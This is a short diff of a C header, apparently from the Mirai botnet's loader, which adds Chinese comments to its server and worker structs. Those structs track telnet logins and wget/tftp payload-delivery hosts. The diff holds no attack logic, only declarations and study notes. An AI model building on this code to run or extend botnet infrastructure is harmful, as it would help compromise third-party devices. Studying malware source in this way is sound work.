@@ -5,25 +5,27 @@
 #include "telnet_info.h"
 #include "connection.h"
 
+
 struct server {
     uint32_t max_open;
     volatile uint32_t curr_open;
     volatile uint32_t total_input, total_logins, total_echoes, total_wgets, total_tftps, total_successes, total_failures;
-    char *wget_host_ip, *tftp_host_ip;
-    struct server_worker *workers;
+    char *wget_host_ip, *tftp_host_ip;//wget和tftp服务器的地址
+    struct server_worker *workers;//指向所有worker进程
     struct connection **estab_conns;
     ipv4_t *bind_addrs;
     pthread_t to_thrd;
-    port_t wget_host_port;
+    port_t wget_host_port;//wget服务器的端口
     uint8_t workers_len, bind_addrs_len;
     int curr_worker_child;
 };
 
+//worker线程服务器
 struct server_worker {
     struct server *srv;
     int efd; // We create a separate epoll context per thread so thread safety isn't our problem
     pthread_t thread;
-    uint8_t thread_id;
+    uint8_t thread_id;//一个cpu一个线程，thread_id表示第几个线程
 };
 
 struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip);
